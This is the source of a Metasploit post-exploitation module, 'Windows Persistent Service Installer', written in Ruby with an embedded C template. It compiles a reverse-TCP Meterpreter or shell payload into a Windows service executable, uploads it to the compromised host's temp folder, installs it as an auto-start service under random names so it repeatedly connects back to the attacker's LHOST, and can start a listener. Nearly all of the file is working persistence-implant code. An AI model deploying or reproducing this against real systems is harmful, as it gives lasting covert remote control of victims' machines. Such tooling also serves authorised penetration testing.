##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Windows Persistent Service Installer',
      'Description'   => %q{
        This Module will generate and upload an executable to a remote host, next will make it a persistent service.
        It will create a new service which will start the payload whenever the service is running. Admin or system
        privilege is required.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Green-m <greenm.xxoo[at]gmail.com>' ],
      'Version'       => '$Revision:1$',
      'Platform'      => [ 'windows' ],
      'SessionTypes'  => [ 'meterpreter', 'shell']
    ))

    register_options(
      [
        OptString.new('PAYLOAD',   [false, 'The payload to use in the service.', "windows/meterpreter/reverse_tcp"]),
        OptAddressLocal.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
        OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),
        OptBool.new('HANDLER', [ false, 'Start an exploit/multi/handler to receive the connection', false]),
        OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format."])
      ])

    register_advanced_options(
      [
        OptInt.new('RetryTime',   [false, 'The retry time that shell connect failed. 5 seconds as default.', 5 ]),
        OptString.new('RemoteExePath', [false, 'The remote victim exe path to run. Use temp directory as default. ']),
        OptString.new('RemoteExeName', [false, 'The remote victim name. Random string as default.']),
        OptString.new('ServiceName',   [false, 'The name of service. Random string as default.' ]),
        OptString.new('ServiceDescription',   [false, 'The description of service. Random string as default.' ])
      ])

  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def run
    unless is_system? || is_admin?
      print_error("Insufficient privileges to create service")
      return
    end

    unless datastore['PAYLOAD'] =~ %r#^windows/(shell|meterpreter)/reverse#
      print_error("Only support for windows meterpreter/shell reverse staged payload")
      return
    end

    print_status("Running module against #{sysinfo['Computer']}")

    # Set variables
    rexepath              = datastore['RemoteExePath']
    @retry_time           = datastore['RetryTime']
    rexename              = datastore['RemoteExeName']     || Rex::Text.rand_text_alpha(4..8)
    @service_name         = datastore['SericeName']        || Rex::Text.rand_text_alpha(4..8)
    @service_description  = datastore['SericeDescription'] || Rex::Text.rand_text_alpha(8..16)

    # Add the windows pe suffix to rexename
    unless rexename.end_with?('.exe')
      rexename << ".exe"
    end

    host, _port = session.tunnel_peer.split(':')
    @clean_up_rc = ""

    # starting handler
    create_handler(datastore['LHOST'], datastore['LPORT'], datastore['PAYLOAD']) if datastore['HANDLER']

    buf = create_payload
    metsvc_code = metsvc_template(buf)
    bin = Metasploit::Framework::Compiler::Windows.compile_c(metsvc_code)

    victim_path = write_exe_to_target(bin, rexename)
    install_service(victim_path)

    clean_rc = log_file
    file_local_write(clean_rc, @clean_up_rc)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")

    report_note(host: host,
        type: "host.persistance.cleanup",
        data: {
          local_id: session.sid,
          stype: session.type,
          desc: session.info,
          platform: session.platform,
          via_payload: session.via_payload,
          via_exploit: session.via_exploit,
          created_at: Time.now.utc,
          commands: @clean_up_rc
        })

  end

  def create_payload
    pay_datastore           = {}
    options                 = datastore['OPTIONS']
    pay_datastore['LHOST']  = datastore['LHOST']
    pay_datastore['LPORT']  = datastore['LPORT']

    unless options.blank?
      options.split(',').each do |x|
        k,v = x.split('=', 2)
        pay_datastore[k.upcase] = v.to_s
      end
    end

    begin
      payload = framework.payloads.create(datastore['PAYLOAD'])
      payload.datastore.merge!(pay_datastore)

      pinst = Msf::EncodedPayload.create(payload)
      pinst = pinst.encoded
      buf = Msf::Simple::Buffer.transform(pinst, 'c', 'buf')
      vprint_status(buf)
    rescue ::Exception => e
      elog("#{e.class} : #{e.message}\n#{e.backtrace * "\n"}")
      print_error("Error: #{e.message}")
    end

    return buf
  end

  # Function for writing executable to target host
  # Code from post/windows/manage/persistence_exe
  #
  def write_exe_to_target(rexe, rexename)
    # check if we have write permission
    rexepath = datastore['RemoteExePath']

    if rexepath
      begin
        temprexe = rexepath + "\\" + rexename
        write_file_to_target(temprexe,rexe)
      rescue Rex::Post::Meterpreter::RequestError
        print_warning("Insufficient privileges to write in #{rexepath}, writing to %TEMP%")
        temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
        write_file_to_target(temprexe,rexe)
      end

    # Write to %temp% directory if not set RemoteExePath
    else
      temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
      write_file_to_target(temprexe,rexe)
    end

    print_good("Meterpreter service exe written to #{temprexe}")

    @clean_up_rc << "execute -H -i -f taskkill.exe -a \"/f /im #{rexename}\"\n" # Use interact to wait until the task ended.
    @clean_up_rc << "rm #{temprexe.gsub("\\", "\\\\\\\\")}\n"

    temprexe
  end

  def write_file_to_target(temprexe,rexe)
    fd = session.fs.file.new(temprexe, "wb")
    fd.write(rexe)
    fd.close
  end

  # Starts a exploit/multi/handler job
  def create_handler(lhost, lport, payload_name)
    pay = client.framework.payloads.create(payload_name)
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    print_status('Starting exploit/multi/handler')
    if !check_for_listener(lhost, lport)
      # Set options for module
      mh = client.framework.exploits.create('multi/handler')
      mh.share_datastore(pay.datastore)
      mh.datastore['WORKSPACE'] = client.workspace
      mh.datastore['PAYLOAD'] = payload_name
      mh.datastore['EXITFUNC'] = 'thread'
      mh.datastore['ExitOnSession'] = true
      # Validate module options
      mh.options.validate(mh.datastore)
      # Execute showing output
      mh.exploit_simple(
          'Payload'     => mh.datastore['PAYLOAD'],
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'    => true
        )

      # Check to make sure that the handler is actually valid
      # If another process has the port open, then the handler will fail
      # but it takes a few seconds to do so.  The module needs to give
      # the handler time to fail or the resulting connections from the
      # target could end up on on a different handler with the wrong payload
      # or dropped entirely.
      select(nil, nil, nil, 5)
      return nil if framework.jobs[mh.job_id.to_s].nil?

      return mh.job_id.to_s
    else
      print_error('A job is listening on the same local port')
      return nil
    end
  end

  # Method for checking if a listener for a given IP and port is present
  # will return true if a conflict exists and false if none is found
  def check_for_listener(lhost, lport)
    client.framework.jobs.each do |k, j|
      if j.name =~ / multi\/handler/
        current_id = j.jid
        current_lhost = j.ctx[0].datastore['LHOST']
        current_lport = j.ctx[0].datastore['LPORT']
        if lhost == current_lhost && lport == current_lport.to_i
          print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
          return true
        end
      end
    end
    return false
  end

  # Function for creating log folder and returning log path
  #-------------------------------------------------------------------------------
  def log_file(log_path = nil)
    # Get hostname
    host = session.sys.config.sysinfo["Computer"]

    # Create Filename info to be appended to downloaded files
    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

    # Create a directory for the logs
    logs = if log_path
             ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
           else
             ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
           end

    # Create the log directory
    ::FileUtils.mkdir_p(logs)

    # logfile name
    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
    logfile
  end

  # Function to install payload as a service
  #-------------------------------------------------------------------------------
  def install_service(path)
    print_status("Creating service #{@service_name}")

    begin
      session.sys.process.execute("cmd.exe /c #{path} #{@install_cmd}", nil, {'Hidden' => true})
    rescue ::Exception => e
      print_error("Failed to install the service.")
      print_error(e.to_s)
    end

    @clean_up_rc = "execute -H -f sc.exe -a \"delete #{@service_name}\"\n" + @clean_up_rc
    @clean_up_rc = "execute -H -f sc.exe -a \"stop #{@service_name}\"\n"   + @clean_up_rc

  end

  def metsvc_template(buf)
    @install_cmd = Rex::Text.rand_text_alpha(4..8)
    @start_cmd   = Rex::Text.rand_text_alpha(4..8)
    metsvc_template = %Q^
    #include <String.h>
    #include <Windows.h>
    #include <stdlib.h>
    #include <stdio.h>

    #define SERVICE_NAME     #{@service_name.inspect}
    #define DISPLAY_NAME     #{@service_description.inspect}
    #define RETRY_TIME       #{@retry_time}

    //
    // Globals
    //

    SERVICE_STATUS status;
    SERVICE_STATUS_HANDLE hStatus;

    //
    // Meterpreter connect back to host
    //

    void start_meterpreter()
    {
    // Your meterpreter shell here
      #{buf}

      LPVOID buffer = (LPVOID)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      memcpy(buffer,buf,sizeof(buf));
      HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)(buffer),NULL,0,NULL);
      WaitForSingleObject(hThread, -1); //INFINITE
      CloseHandle(hThread);
    }

    //
    // Call self without parameter to start meterpreter
    //

    void self_call()
    {
        char path[MAX_PATH];
        char cmd[MAX_PATH];

        if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
            // Get module file name failed
            return;
        }

        STARTUPINFO startup_info;
        PROCESS_INFORMATION process_information;

        ZeroMemory(&startup_info, sizeof(startup_info));
        startup_info.cb = sizeof(startup_info);

        ZeroMemory(&process_information, sizeof(process_information));

        // If create process failed.
        // CREATE_NO_WINDOW = 0x08000000
        if (CreateProcess(path, path, NULL, NULL, TRUE, 0x08000000, NULL,
                          NULL, &startup_info, &process_information) == 0)
        {
            return;
        }

        // Wait until the process died.
        WaitForSingleObject(process_information.hProcess, -1);
    }

    //
    // Process control requests from the Service Control Manager
    //

    VOID WINAPI ServiceCtrlHandler(DWORD fdwControl)
    {
        switch (fdwControl) {
            case SERVICE_CONTROL_STOP:
            case SERVICE_CONTROL_SHUTDOWN:
                status.dwWin32ExitCode = 0;
                status.dwCurrentState = SERVICE_STOPPED;
                break;

            case SERVICE_CONTROL_PAUSE:
                status.dwWin32ExitCode = 0;
                status.dwCurrentState = SERVICE_PAUSED;
                break;

            case SERVICE_CONTROL_CONTINUE:
                status.dwWin32ExitCode = 0;
                status.dwCurrentState = SERVICE_RUNNING;
                break;

            default:
                break;
        }

        if (SetServiceStatus(hStatus, &status) == 0) {
            //printf("Cannot set service status (0x%08x)", GetLastError());
            exit(1);
        }

        return;
    }


    //
    // Main function of service
    //

    VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
    {
        // Register the service handler

        hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

        if (hStatus == 0) {
            //printf("Cannot register service handler (0x%08x)", GetLastError());
            exit(1);
        }

        // Initialize the service status structure

        status.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
        status.dwCurrentState = SERVICE_RUNNING;
        status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
        status.dwWin32ExitCode = 0;
        status.dwServiceSpecificExitCode = 0;
        status.dwCheckPoint = 0;
        status.dwWaitHint = 0;

        if (SetServiceStatus(hStatus, &status) == 0) {
            //printf("Cannot set service status (0x%08x)", GetLastError());
            return;
        }

        // Start the Meterpreter
        while (status.dwCurrentState == SERVICE_RUNNING) {
            self_call();
            Sleep(RETRY_TIME);
        }

        return;
    }


    //
    // Installs and starts the Meterpreter service
    //

    BOOL install_service()
    {
        SC_HANDLE hSCManager;
        SC_HANDLE hService;

        char path[MAX_PATH];

        // Get the current module name

        if (!GetModuleFileName(NULL, path, MAX_PATH)) {
            //printf("Cannot get module name (0x%08x)", GetLastError());
            return FALSE;
        }

        // Build the service command line

        char cmd[MAX_PATH];
        int len = _snprintf(cmd, sizeof(cmd), "\\"%s\\" #{@start_cmd}", path);

        if (len < 0 || len == sizeof(cmd)) {
            //printf("Cannot build service command line (0x%08x)", -1);
            return FALSE;
        }

        // Open the service manager

        hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

        if (hSCManager == NULL) {
            //printf("Cannot open service manager (0x%08x)", GetLastError());
            return FALSE;
        }

        // Create the service

        hService = CreateService(
            hSCManager,
            SERVICE_NAME,
            DISPLAY_NAME,
            0xf01ff,            // SERVICE_ALL_ACCESS
            SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            cmd,
            NULL,
            NULL,
            NULL,
            NULL,   /* LocalSystem account */
            NULL
        );

        if (hService == NULL) {
            //printf("Cannot create service (0x%08x)", GetLastError());

            CloseServiceHandle(hSCManager);
            return FALSE;
        }

        // Start the service

        char* args[] = { path, "service" };

        if (StartService(hService, 2, (const char**)&args) == 0) {
            DWORD err = GetLastError();

            if (err != 0x420) //ERROR_SERVICE_ALREADY_RUNNING
            {
                //printf("Cannot start service %s (0x%08x)", SERVICE_NAME, err);

                CloseServiceHandle(hService);
                CloseServiceHandle(hSCManager);
                return FALSE;
            }
        }

        // Cleanup

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);

        //printf("Service %s successfully installed.", SERVICE_NAME);

        return TRUE;
    }

    //
    // Start the service
    //

    void start_service()
    {
        SERVICE_TABLE_ENTRY ServiceTable[] =
        {
            { SERVICE_NAME, &ServiceMain },
            { NULL, NULL }
        };

        if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
            //printf("Cannot start the service control dispatcher (0x%08x)",GetLastError());
            exit(1);
        }
    }


    //
    // Main function
    //

    int main()
    {
        // Parse the command line argument.
        // For now, int main(int argc, char *argv) is buggy with metasm.
        // So we choose this approach to achieve it.
        LPTSTR cmdline;
        cmdline = GetCommandLine();

        char *argv[MAX_PATH];
        char * ch = strtok(cmdline," ");
        int argc = 0;

        while (ch != NULL)
        {
           argv[argc] = malloc( strlen(ch)+1) ;
           strncpy(argv[argc], ch, strlen(ch)+1);

           ch = strtok (NULL, " ");
           argc++;
        }

        if (argc == 2) {

            if (strcmp(argv[1], #{@install_cmd.inspect}) == 0) {

                // Installs and starts the service

                install_service();
                return 0;
            }
            else if (strcmp(argv[1], #{@start_cmd.inspect}) == 0) {
                // Starts the Meterpreter as a service

                start_service();
                return 0;
            }
        }

        // Starts the Meterpreter as a normal application

        start_meterpreter();

        return 0;
    }
    ^

    metsvc_template
  end

end


